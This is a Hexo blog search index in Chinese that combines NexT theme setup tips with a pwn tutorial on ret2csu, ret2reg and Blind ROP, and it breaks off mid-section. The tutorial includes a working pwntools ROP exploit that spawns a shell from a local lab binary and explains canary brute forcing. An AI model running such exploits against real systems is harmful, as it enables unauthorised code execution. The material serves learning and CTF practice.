<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>next定制</title>
    <url>/2022/06/16/config/next%20tips/</url>
    <content><![CDATA[<h2 id="js脚本实现自定义menu页"><a href="#js脚本实现自定义menu页" class="headerlink" title="js脚本实现自定义menu页"></a>js脚本实现自定义menu页</h2><blockquote>
<p>操作对象：blog&#x2F;theme&#x2F;next&#x2F;文件夹下</p>
</blockquote>
<ul>
<li><p>在主题配置文件<code>_config.yml</code>中<code>menu</code>栏下添加新的标签页，并在<code>blog/source</code>文件夹下添加同样的文件夹，<code>||</code>右侧是图标，采用的是<code>Font Awesome</code>中的图标位置，不过推荐用<code>fa-solid</code>类型的<code>icon</code>，因为其他的好像显示失败。注意在如<code>/source/pwn</code>中的<code>index.md</code>中不需要写<code>type</code>和<code>layout</code></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">menu:</span><br><span class="line">  home: / || fa fa-home</span><br><span class="line">  about: /about/ || fa fa-user</span><br><span class="line">  tags: /tags/ || fa fa-tags</span><br><span class="line">  categories: /categories/ || fa fa-th</span><br><span class="line">  archives: /archives/ || fa fa-archive</span><br><span class="line">  pwn: /pwn/ || fas fa-flag-checkered</span><br><span class="line">  system: /system/ || fas fa-laptop-code</span><br></pre></td></tr></table></figure>
</li>
<li><p>在<code>/theme/next/scripts</code>下新建一个<code>pwn.js</code>文件来控制新的<code>pwn</code>菜单栏的内容</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> pagination = <span class="built_in">require</span>(<span class="string">&#x27;hexo-pagination&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> filteredCategory = <span class="string">&#x27;pwn&#x27;</span>;</span><br><span class="line"></span><br><span class="line">hexo.<span class="property">extend</span>.<span class="property">generator</span>.<span class="title function_">register</span>(<span class="string">&#x27;pwn&#x27;</span>, <span class="keyword">function</span>(<span class="params">locals</span>)&#123;</span><br><span class="line">  <span class="keyword">var</span> pwnPosts = locals.<span class="property">posts</span>.<span class="title function_">filter</span>(<span class="keyword">function</span>(<span class="params">x</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> x.<span class="property">categories</span>.<span class="property">data</span>[<span class="number">0</span>].<span class="property">name</span> == filteredCategory;</span><br><span class="line">  &#125;);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="title function_">pagination</span>(<span class="string">&#x27;pwn&#x27;</span>, pwnPosts, &#123;</span><br><span class="line">    <span class="attr">perPage</span>: <span class="number">12</span>,</span><br><span class="line">    <span class="attr">layout</span>: [<span class="string">&#x27;archive&#x27;</span>]</span><br><span class="line">  &#125;)</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<ul>
<li>注意最后一个<code>layout</code>可以用<code>&#39;archive&#39;</code>来呈现时间轴的效果，不必再自定义了（报错麻烦）</li>
<li>这段代码的功能就是把所有文章按照<code>category</code>过滤，属于<code>pwn</code>的显示出来</li>
</ul>
</li>
<li><p>执行生效即可</p>
</li>
</ul>
<h2 id="pace实现加载特效"><a href="#pace实现加载特效" class="headerlink" title="pace实现加载特效"></a>pace实现加载特效</h2><p>由于网页不可能一直都秒进，总会等待一段时间的，所以可以设置顶部加载条。Next 已经集成了很多加载特效，可以在下面选项中在线调试测试一下。</p>
<p>搜索<code>pace</code>，找到如下代码：</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"># 页面顶部加载条</span><br><span class="line"># Progress bar in the <span class="attribute">top</span> during page loading.</span><br><span class="line">pace: true</span><br><span class="line"># Themes list:</span><br><span class="line">#pace-theme-big-counter</span><br><span class="line">#pace-theme-bounce</span><br><span class="line">#pace-theme-barber-shop</span><br><span class="line">#pace-theme-center-atom</span><br><span class="line">#pace-theme-center-circle</span><br><span class="line">#pace-theme-center-radar</span><br><span class="line">#pace-theme-center-simple</span><br><span class="line">#pace-theme-corner-indicator</span><br><span class="line">#pace-theme-fill-left</span><br><span class="line">#pace-theme-flash</span><br><span class="line">#pace-theme-loading-bar</span><br><span class="line">#pace-theme-mac-osx</span><br><span class="line">#pace-theme-minimal</span><br><span class="line"># For example</span><br><span class="line"># pace_theme: pace-theme-center-simple</span><br><span class="line">pace_theme: pace-theme-minimal  # 默认设置，可以修改为上述任何一个</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h2 id="加载图片"><a href="#加载图片" class="headerlink" title="加载图片"></a>加载图片</h2><ul>
<li><p>装插件</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">npm install hexo-renderer-marked</span><br></pre></td></tr></table></figure>
</li>
<li><p>在全局配置文件<code>_config.yml</code>中</p>
<ol>
<li><p>修改是否生成资源文件夹</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line">post_asset_folder: true</span><br></pre></td></tr></table></figure>
</li>
<li><p>添加标记</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line">marked:</span><br><span class="line">  prependRoot: true</span><br><span class="line">  postAsset: true</span><br></pre></td></tr></table></figure></li>
</ol>
</li>
<li><p>此时通过<code>hexo new &#39;title&#39;</code>可以在<code>_posts</code>中生成<code>title.md</code>和同名资源文件夹<code>title</code></p>
<blockquote>
<p>都是可移动的，但资源文件夹和原文件要同时移动</p>
</blockquote>
</li>
<li><p>修改<code>typora</code>图片偏好为相对路径优先</p>
</li>
<li><p>进入相对路径后注意只有一个图片名（在对应的资源文件夹下）</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">![name](name.<span class="property">png</span>)</span><br></pre></td></tr></table></figure>
</li>
<li><p>当缩放时<code>src</code>也只能有图片名</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;brop_stop_gadgets.png&quot;</span> <span class="attr">alt</span>=<span class="string">&quot;brop_stop_gadgets&quot;</span> <span class="attr">style</span>=<span class="string">&quot;zoom:38%;&quot;</span> /&gt;</span></span><br></pre></td></tr></table></figure></li>
</ul>
]]></content>
      <categories>
        <category>hexo</category>
      </categories>
      <tags>
        <tag>hexo</tag>
        <tag>next theme</tag>
      </tags>
  </entry>
  <entry>
    <title>ucore_lab4</title>
    <url>/2022/06/16/system/ucore_lab4/</url>
    <content><![CDATA[<h1 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h1><h2 id="分类测试"><a href="#分类测试" class="headerlink" title="分类测试"></a>分类测试</h2>]]></content>
      <categories>
        <category>system</category>
      </categories>
      <tags>
        <tag>operating system</tag>
        <tag>system</tag>
      </tags>
  </entry>
  <entry>
    <title>blind ROP</title>
    <url>/2022/06/16/pwn/brop/</url>
    <content><![CDATA[<h1 id="Blind-ROP"><a href="#Blind-ROP" class="headerlink" title="Blind ROP"></a>Blind ROP</h1><hr>
<h2 id="x86与x64回顾"><a href="#x86与x64回顾" class="headerlink" title="x86与x64回顾"></a>x86与x64回顾</h2><ul>
<li><p>x86</p>
<ul>
<li><strong>函数参数</strong>在<strong>函数返回地址</strong>的上方</li>
</ul>
</li>
<li><p>x64</p>
<ul>
<li><p>System V AMD64 ABI (Linux、FreeBSD、macOS 等采用) 中前六个整型或指针参数依次保存在 <strong>RDI, RSI, RDX, RCX, R8 和 R9 寄存器</strong>中，如果还有更多的参数的话才会保存在栈上。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">rdi -&gt; rsi -&gt; rdx -&gt; rcx -&gt; r8 -&gt; r9</span><br></pre></td></tr></table></figure>
</li>
<li><p>内存地址不能大于 0x00007FFFFFFFFFFF，<strong>6 个字节长度</strong>，否则会抛出异常。</p>
</li>
</ul>
</li>
</ul>
<h2 id="ret2csu"><a href="#ret2csu" class="headerlink" title="ret2csu"></a>ret2csu</h2><blockquote>
<p>在 64 位程序中，函数的前 6 个参数是通过寄存器传递的，但是大多数时候，我们很难找到每一个寄存器对应的 gadgets。 这时候，我们可以利用 x64 下的 <code>__libc_csu_init </code>中的 <code>gadgets</code>。这个函数是用来对 <code>libc</code> 进行初始化操作的，而一般的程序都会调用 <code>libc</code> 函数，所以这个函数一定会存在</p>
</blockquote>
<h3 id="libc-csu-init"><a href="#libc-csu-init" class="headerlink" title="__libc_csu_init"></a>__libc_csu_init</h3><blockquote>
<p>使用文件<code>level</code>，由于官方给出的level带有<strong>编译优化</strong>，即像这样：</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">--------------------------------------------------------------------------</span><br><span class="line">.text:0000000000400606                 mov     rbx, [rsp+38h+var_30]</span><br><span class="line">.text:000000000040060B                 mov     rbp, [rsp+38h+var_28]</span><br><span class="line">.text:0000000000400610                 mov     r12, [rsp+38h+var_20]</span><br><span class="line">.text:0000000000400615                 mov     r13, [rsp+38h+var_18]</span><br><span class="line">.text:000000000040061A                 mov     r14, [rsp+38h+var_10]</span><br><span class="line">.text:000000000040061F                 mov     r15, [rsp+38h+var_8]</span><br><span class="line">.text:0000000000400624                 add     rsp, 38h</span><br><span class="line">.text:0000000000400628                 retn</span><br><span class="line">--------------------------------------------------------------------------</span><br></pre></td></tr></table></figure>

<p>实际上我们所需要的是<code>__libc_csu_init</code>中的下面这一段</p>
<blockquote>
<p>重新编译得到了<code>level</code>，因此本篇分析<code>level</code></p>
<p>编译指令</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">gcc -no-pie -g -fno-stack-protector  -o level level.c</span><br></pre></td></tr></table></figure>
</blockquote>
<p><code>__libc_csu_init</code>代码</p>
<blockquote>
<p>查看汇编代码指令（风格：intel）</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">objdump -S -mi386:x86-<span class="number">64</span>:intel level</span><br></pre></td></tr></table></figure>
</blockquote>
<p>代码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">004011c0 &lt;__libc_csu_init&gt;:</span><br><span class="line">  4011c0:	f3 0f 1e fa          	endbr64 </span><br><span class="line">  4011c4:	41 57                	push   r15</span><br><span class="line">  4011c6:	4c 8d 3d 43 2c 00 00 	lea    r15,[rip+0x2c43]        # 403e10 &lt;__frame_dummy_init_array_entry&gt;</span><br><span class="line">  4011cd:	41 56                	push   r14</span><br><span class="line">  4011cf:	49 89 d6             	mov    r14,rdx</span><br><span class="line">  4011d2:	41 55                	push   r13</span><br><span class="line">  4011d4:	49 89 f5             	mov    r13,rsi</span><br><span class="line">  4011d7:	41 54                	push   r12</span><br><span class="line">  4011d9:	41 89 fc             	mov    r12d,edi</span><br><span class="line">  4011dc:	55                   	push   rbp</span><br><span class="line">  4011dd:	48 8d 2d 34 2c 00 00 	lea    rbp,[rip+0x2c34]        # 403e18 &lt;__do_global_dtors_aux_fini_array_entry&gt;</span><br><span class="line">  4011e4:	53                   	push   rbx</span><br><span class="line">  4011e5:	4c 29 fd             	sub    rbp,r15</span><br><span class="line">  4011e8:	48 83 ec 08          	sub    rsp,0x8</span><br><span class="line">  4011ec:	e8 0f fe ff ff       	call   401000 &lt;_init&gt;</span><br><span class="line">  4011f1:	48 c1 fd 03          	sar    rbp,0x3</span><br><span class="line">  4011f5:	74 1f                	je     401216 &lt;__libc_csu_init+0x56&gt;</span><br><span class="line">  4011f7:	31 db                	xor    ebx,ebx</span><br><span class="line">  4011f9:	0f 1f 80 00 00 00 00 	nop    DWORD PTR [rax+0x0]</span><br><span class="line">-------------------------------------------------------------</span><br><span class="line">[2]</span><br><span class="line">  401200:	4c 89 f2             	mov    rdx,r14</span><br><span class="line">  401203:	4c 89 ee             	mov    rsi,r13</span><br><span class="line">  401206:	44 89 e7             	mov    edi,r12d</span><br><span class="line">  401209:	41 ff 14 df          	call   QWORD PTR [r15+rbx*8]</span><br><span class="line"> ------------------------------------------------------------- </span><br><span class="line"> [3]</span><br><span class="line"> * 40120d:	48 83 c3 01          	add    rbx,0x1</span><br><span class="line"> * 401211:	48 39 dd             	cmp    rbp,rbx</span><br><span class="line"> * 401214:	75 ea                	jne    401200 &lt;__libc_csu_init+0x40&gt;</span><br><span class="line">   401216:	48 83 c4 08          	add    rsp,0x8</span><br><span class="line">-------------------------------------------------------------</span><br><span class="line">[1]</span><br><span class="line">  40121a:	5b                   	pop    rbx</span><br><span class="line">  40121b:	5d                   	pop    rbp</span><br><span class="line">  40121c:	41 5c                	pop    r12</span><br><span class="line">  40121e:	41 5d                	pop    r13</span><br><span class="line">  401220:	41 5e                	pop    r14</span><br><span class="line">  401222:	41 5f                	pop    r15</span><br><span class="line">  401224:	c3                   	ret    </span><br><span class="line">-------------------------------------------------------------</span><br><span class="line">  401225:	66 66 2e 0f 1f 84 00 	data16 nop WORD PTR cs:[rax+rax*1+0x0]</span><br><span class="line">  40122c:	00 00 00 00 </span><br></pre></td></tr></table></figure>

<p>因此只需要借助</p>
<ul>
<li><p>[1]<code>pop-ret</code>结构</p>
<blockquote>
<p><code>rbx</code>等会<strong>间接</strong>影响到后续的控制</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">40121a:	5b                   	pop    rbx</span><br><span class="line">40121b:	5d                   	pop    rbp</span><br><span class="line">40121c:	41 5c                	pop    r12</span><br><span class="line">40121e:	41 5d                	pop    r13</span><br><span class="line">401220:	41 5e                	pop    r14</span><br><span class="line">401222:	41 5f                	pop    r15</span><br><span class="line">401224:	c3                   	ret    </span><br></pre></td></tr></table></figure>
</li>
<li><p>[2] 控制参数<code>rdi -&gt;rsi -&gt;rdx -&gt;rcx -&gt;r8 -&gt;r9</code></p>
<blockquote>
<ol>
<li><p>此处控制的是 </p>
<ul>
<li>param3 : rdx</li>
<li>param2 : rsi</li>
<li>param1( low-32-bit ) : edi  -&gt; rdi 高32位会清零</li>
</ul>
</li>
<li><p>如果我们可以合理地控制 <code>r15</code> 与 <code>rbx</code>，那么我们就可以调用我们想要调用的函数</p>
<ul>
<li>rbx &#x3D; 0 , r15 为存储我们想要调用的函数的地址</li>
</ul>
</li>
</ol>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">401200:	4c 89 f2             	mov    rdx,r14</span><br><span class="line">401203:	4c 89 ee             	mov    rsi,r13</span><br><span class="line">401206:	44 89 e7             	mov    edi,r12d</span><br><span class="line">401209:	41 ff 14 df          	call   QWORD PTR [r15+rbx*8]</span><br></pre></td></tr></table></figure>
</li>
<li><p>[3] 控制函数不跳转</p>
<blockquote>
<p>我们可以控制 rbx 与 rbp 的之间的关系为 rbx+1 &#x3D; rbp，这样我们就不会执行</p>
<p><code>jne    401200 &lt;__libc_csu_init+0x40&gt;</code></p>
<p>进而可以继续执行下面的汇编程序。这里我们可以简单的设置 rbx&#x3D;0，rbp&#x3D;1。</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">* 40120d:	48 83 c3 01          	add    rbx,0x1</span><br><span class="line">* 401211:	48 39 dd             	cmp    rbp,rbx</span><br><span class="line">* 401214:	75 ea                	jne    401200 &lt;__libc_csu_init+0x40&gt;</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="分析level"><a href="#分析level" class="headerlink" title="分析level"></a>分析<code>level</code></h3><blockquote>
<p>查看漏洞函数</p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> __cdecl <span class="title function_">vulnerable_function</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">128</span>]; <span class="comment">// [rsp+0h] [rbp-80h] BYREF</span></span><br><span class="line"></span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x200</span>uLL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>查看<code>__libc_csu_init</code></p>
<p>虽然开启了<code>RELRO</code>，但是<code>file</code>查看时并没有去除符号，因此是可见的</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">$ file level</span><br><span class="line">level: ELF <span class="number">64</span>-bit LSB executable, x86-<span class="number">64</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-<span class="number">64.</span>so<span class="number">.2</span>, BuildID[sha1]=a28f7d9fc82c9c62d5e572365f45d29b78239d50, <span class="keyword">for</span> GNU/Linux <span class="number">3.2</span><span class="number">.0</span>, <span class="keyword">with</span> debug_info, <span class="keyword">not</span> stripped &lt;------ !!! ----</span><br></pre></td></tr></table></figure>
</blockquote>
<p>查看反汇编内容（得到内存地址）</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">disassemble __libc_csu_init</span><br><span class="line">Dump of assembler code for function __libc_csu_init:</span><br><span class="line">   0x00000000004011c0 &lt;+0&gt;:	endbr64 </span><br><span class="line">   0x00000000004011c4 &lt;+4&gt;:	push   r15</span><br><span class="line">   0x00000000004011c6 &lt;+6&gt;:	lea    r15,[rip+0x2c43]        # 0x403e10</span><br><span class="line">   0x00000000004011cd &lt;+13&gt;:	push   r14</span><br><span class="line">   0x00000000004011cf &lt;+15&gt;:	mov    r14,rdx</span><br><span class="line">   0x00000000004011d2 &lt;+18&gt;:	push   r13</span><br><span class="line">   0x00000000004011d4 &lt;+20&gt;:	mov    r13,rsi</span><br><span class="line">   0x00000000004011d7 &lt;+23&gt;:	push   r12</span><br><span class="line">   0x00000000004011d9 &lt;+25&gt;:	mov    r12d,edi</span><br><span class="line">   0x00000000004011dc &lt;+28&gt;:	push   rbp</span><br><span class="line">   0x00000000004011dd &lt;+29&gt;:	lea    rbp,[rip+0x2c34]        # 0x403e18</span><br><span class="line">   0x00000000004011e4 &lt;+36&gt;:	push   rbx</span><br><span class="line">   0x00000000004011e5 &lt;+37&gt;:	sub    rbp,r15</span><br><span class="line">   0x00000000004011e8 &lt;+40&gt;:	sub    rsp,0x8</span><br><span class="line">   0x00000000004011ec &lt;+44&gt;:	call   0x401000 &lt;_init&gt;</span><br><span class="line">   0x00000000004011f1 &lt;+49&gt;:	sar    rbp,0x3</span><br><span class="line">   0x00000000004011f5 &lt;+53&gt;:	je     0x401216 &lt;__libc_csu_init+86&gt;</span><br><span class="line">   0x00000000004011f7 &lt;+55&gt;:	xor    ebx,ebx</span><br><span class="line">   0x00000000004011f9 &lt;+57&gt;:	nop    DWORD PTR [rax+0x0]</span><br><span class="line">   0x0000000000401200 &lt;+64&gt;:	mov    rdx,r14</span><br><span class="line">   0x0000000000401203 &lt;+67&gt;:	mov    rsi,r13</span><br><span class="line">   0x0000000000401206 &lt;+70&gt;:	mov    edi,r12d</span><br><span class="line">   0x0000000000401209 &lt;+73&gt;:	call   QWORD PTR [r15+rbx*8]</span><br><span class="line">   0x000000000040120d &lt;+77&gt;:	add    rbx,0x1</span><br><span class="line">   0x0000000000401211 &lt;+81&gt;:	cmp    rbp,rbx</span><br><span class="line">   0x0000000000401214 &lt;+84&gt;:	jne    0x401200 &lt;__libc_csu_init+64&gt;</span><br><span class="line">   0x0000000000401216 &lt;+86&gt;:	add    rsp,0x8</span><br><span class="line">   0x000000000040121a &lt;+90&gt;:	pop    rbx</span><br><span class="line">   0x000000000040121b &lt;+91&gt;:	pop    rbp</span><br><span class="line">   0x000000000040121c &lt;+92&gt;:	pop    r12</span><br><span class="line">   0x000000000040121e &lt;+94&gt;:	pop    r13</span><br><span class="line">   0x0000000000401220 &lt;+96&gt;:	pop    r14</span><br><span class="line">   0x0000000000401222 &lt;+98&gt;:	pop    r15</span><br><span class="line">   0x0000000000401224 &lt;+100&gt;:	ret    </span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></table></figure>

<h4 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">Payload</span><br><span class="line">	&gt;Low Address</span><br><span class="line">     +-------------+</span><br><span class="line">     | cyclic      | &lt;--- hexToDecimal(<span class="number">0x80</span>-<span class="number">0x00</span>) + <span class="number">8</span> = <span class="number">136</span> <span class="built_in">bytes</span></span><br><span class="line">     | ret         | &lt;--- 关键(<span class="number">64</span>位下的 <span class="number">16</span>-<span class="built_in">bytes</span> 栈对齐)</span><br><span class="line">     | pop_rdi_ret |</span><br><span class="line">     | addr_bin_sh |</span><br><span class="line">     | addr_system |</span><br><span class="line">     +-------------+</span><br><span class="line">	&gt;High Address</span><br></pre></td></tr></table></figure>

<ul>
<li><p>破解前需要先关闭<code>ASLR</code></p>
</li>
<li><p>gdb调试过程中到最后<code>segmental fault</code>，程序停留在了</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="number">0x7ffff7e13e3c</span> &lt;do_system+<span class="number">364</span>&gt;    movaps xmmword ptr [rsp + <span class="number">0x50</span>], xmm0</span><br></pre></td></tr></table></figure>

<p>经查看<code>rsp</code>的值为</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">rsp   <span class="number">0x7fffffffd838</span></span><br></pre></td></tr></table></figure>

<p>没有<code>16-bytes</code>对齐，因此<code>rsp+0x50</code>没有对齐，然而<code>movaps</code>需要<code>16-bytes</code>对齐，因此执行失败，需要查找ret指令的位置填充栈空间</p>
</li>
</ul>
<h4 id="报错dbg图"><a href="#报错dbg图" class="headerlink" title="报错dbg图"></a>报错<code>dbg</code>图</h4><p><img src="/2022/06/16/pwn/brop/ret2csu_segment_fault.png" alt="ret2csu_segment_fault"></p>
<h4 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot; VA from __libc_csu_init &quot;&quot;&quot;</span></span><br><span class="line">pop_rbx = <span class="number">0x40121b</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x401223</span></span><br><span class="line">ret_addr = <span class="number">0x40101a</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot; offset from database &quot;&quot;&quot;</span></span><br><span class="line">offset___libc_start_main_ret = <span class="number">0x24083</span></span><br><span class="line">offset_system = <span class="number">0x0000000000052290</span></span><br><span class="line">offset_dup2 = <span class="number">0x000000000010e8c0</span></span><br><span class="line">offset_read = <span class="number">0x000000000010dfc0</span></span><br><span class="line">offset_write = <span class="number">0x000000000010e060</span></span><br><span class="line">offset_str_bin_sh = <span class="number">0x1b45bd</span></span><br><span class="line">offset___libc_start_main = <span class="number">0x0000000000023f90</span></span><br><span class="line">offset_puts = <span class="number">0x0000000000084420</span></span><br><span class="line">offset_exit = <span class="number">0x0000000000046a40</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot; addr of functions in libc &quot;&quot;&quot;</span></span><br><span class="line">addr_write = <span class="number">0x7ffff7ed0060</span></span><br><span class="line"></span><br><span class="line">libcBase = addr_write - offset_write</span><br><span class="line"></span><br><span class="line">addr_system = libcBase + offset_system  <span class="comment"># shell function addr</span></span><br><span class="line"></span><br><span class="line">addr_str_bin_sh = libcBase + offset_str_bin_sh  <span class="comment"># parameter</span></span><br><span class="line"></span><br><span class="line">addr_exit = libcBase + offset_exit  <span class="comment"># exit function</span></span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&#x27;./level&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># io = gdb.debug(&quot;./level&quot;,&quot;break main&quot;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># payload = flat(cyclic(132),pop_rdi_ret,addr_str_bin_sh,addr_system,pop_rdi_ret,0,)</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">136</span> + p64(ret_addr) +  p64(pop_rdi_ret) + p64(addr_str_bin_sh) + p64(addr_system) + p64(pop_rdi_ret) + p64(<span class="number">0</span>) + p64(addr_exit)</span><br><span class="line"></span><br><span class="line"><span class="comment"># payload_error = b&#x27;a&#x27; * 136 +  p64(pop_rdi_ret) + p64(addr_str_bin_sh) + p64(addr_system) + p64(pop_rdi_ret) + p64(0) + p64(addr_exit)</span></span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line"><span class="comment"># io.sendline(payload)</span></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>



<h4 id="栈对齐"><a href="#栈对齐" class="headerlink" title="栈对齐"></a>栈对齐</h4><blockquote>
<p>栈的字节对齐，实际是指栈顶指针必须须是16字节的整数倍。我们都知道栈对齐帮助在尽可能少的内存访问周期内读取数据，不对齐堆栈指针可能导致严重的性能下降。</p>
</blockquote>
<ul>
<li>即使数据没有对齐，我们的程序也是可以执行的，只是效率有点低而已，但是某些型号的Intel和AMD处理器对于有些实现多媒体操作的SSE指令，如果数据没有对齐的话，就无法正确执行。这些指令对16字节内存进行操作，在SSE单元和内存之间传送数据的指令要求内存地址必须是16的倍数。</li>
<li>因此，任何针对x86_64处理器的编译器和运行时系统都必须保证分配用来保存可能会被SSE寄存器读或写的数据结构的内存，都必须是16字节对齐的，这就形成了一种标准：</li>
<li>任何内存分配函数（alloca, malloc, calloc或realloc）生成的块起始地址都必须是16的倍数。</li>
<li>大多数函数的栈帧的边界都必须是16直接的倍数。</li>
</ul>
<p>如上，在运行时栈中，不仅传递的参数和局部变量要满足字节对齐，我们的栈指针（%rsp）也必须是16的倍数。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">movups</span><br><span class="line">mov //移动指令</span><br><span class="line">u //不必<span class="number">16</span>字节对齐</span><br><span class="line">ps //（packed single-precision floating-point）表示打包的单精度浮点数</span><br><span class="line"></span><br><span class="line">movaps</span><br><span class="line">mov //移动指令</span><br><span class="line">u //必需<span class="number">16</span>字节对齐</span><br><span class="line">ps //（packed single-precision floating-point）表示打包的单精度浮点数</span><br></pre></td></tr></table></figure>





<h2 id="ret2reg"><a href="#ret2reg" class="headerlink" title="ret2reg"></a>ret2reg</h2><blockquote>
<h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><ol>
<li>查看溢出函返回时哪个寄存值指向溢出缓冲区空间</li>
<li>然后反编译二进制，查找 call reg 或者 jmp reg 指令，将 EIP 设置为该指令地址</li>
<li>reg 所指向的空间上注入 Shellcode (需要确保该空间是可以执行的，但通常都是栈上的)</li>
</ol>
</blockquote>
<h2 id="BROP"><a href="#BROP" class="headerlink" title="BROP"></a>BROP</h2><blockquote>
<ul>
<li><code>Blind ROP</code> : BROP(Blind ROP) 于 2014 年由 Standford 的 Andrea Bittau 提出，其相关研究成果发表在 Oakland 2014，其论文题目是 <strong>Hacking Blind</strong></li>
<li>BROP 是没有对应应用程序的源代码或者二进制文件下，对程序进行攻击，劫持程序的执行流</li>
</ul>
</blockquote>
<h3 id="攻击条件"><a href="#攻击条件" class="headerlink" title="攻击条件"></a>攻击条件</h3><ol>
<li>源程序必须存在栈溢出漏洞，以便于攻击者可以控制程序流程。</li>
<li><strong>服务器端的进程在崩溃之后会重新启动</strong>，并且重新启动的进程的地址与先前的地址一样（这也就是说即使程序有 ASLR 保护，但是其只是在程序最初启动的时候有效果）。目前 nginx, MySQL, Apache, OpenSSH 等服务器应用都是符合这种特性的。</li>
</ol>
<h3 id="基本思路"><a href="#基本思路" class="headerlink" title="基本思路"></a>基本思路</h3><p>在 BROP 中，基本的遵循的思路如下</p>
<ul>
<li><p>判断栈溢出长度</p>
<ul>
<li>暴力枚举</li>
</ul>
</li>
<li><p>Stack Reading</p>
<ul>
<li><p>获取栈上的数据来泄露 canaries，以及 ebp 和返回地址。</p>
</li>
<li><p>目前经典的栈布局</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">buffer|canary|saved fame pointer|saved returned address</span><br></pre></td></tr></table></figure></li>
</ul>
<ul>
<li><p>在 32 位的情况下，我们最多需要爆破 1024 次，64 位最多爆破 2048 次。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>原理 &lt;&lt;&lt;</span><br><span class="line">调节payload的长度,每次暴力破解一个字节的内容(即payload尾部),如果该byte破解,则payload再加一字节的内容,作为`canary`中的下一部分(byte)</span><br><span class="line">------------------------------</span><br><span class="line">Every Byte includes <span class="number">256</span> = <span class="number">2</span>^<span class="number">8</span></span><br><span class="line"><span class="number">32</span>-bit : <span class="number">4</span> * <span class="number">2</span>^<span class="number">8</span> = <span class="number">2</span>^<span class="number">10</span> = <span class="number">1024</span></span><br><span class="line"><span class="number">64</span>-bit : <span class="number">8</span> * <span class="number">2</span>^<span class="number">8</span> = <span class="number">2</span>^<span class="number">11</span> = <span class="number">2048</span></span><br><span class="line">------------------------------</span><br></pre></td></tr></table></figure>

<p><img src="/2022/06/16/pwn/brop/stack_reading.png" alt="stack_reading"></p>
</li>
</ul>
</li>
<li><p>Blind ROP</p>
<ul>
<li><p>最朴素的执行 write 函数的方法就是构造系统调用。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pop rdi; ret # socket</span><br><span class="line">pop rsi; ret # buffer</span><br><span class="line">pop rdx; ret # length</span><br><span class="line">pop rax; ret # write syscall number</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure>

<p>但通常来说，这样的方法都是比较困难的，因为想要找到一个 syscall 的地址基本不可能。。。我们可以通过转换为<strong>找 write</strong>的方式来获取。</p>
</li>
<li><p>找到足够多的 gadgets 来控制输出函数的参数，并且对其进行调用，比如说常见的 write 函数以及 puts 函数。</p>
<ul>
<li><p>rdx 只是我们用来输出程序字节长度的变量，只要不为 0 即可</p>
<ul>
<li><p>但是，在程序中很少出现</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pop rdx; ret</span><br></pre></td></tr></table></figure></li>
</ul>
</li>
<li><p>控制 rdx 的数值</p>
<blockquote>
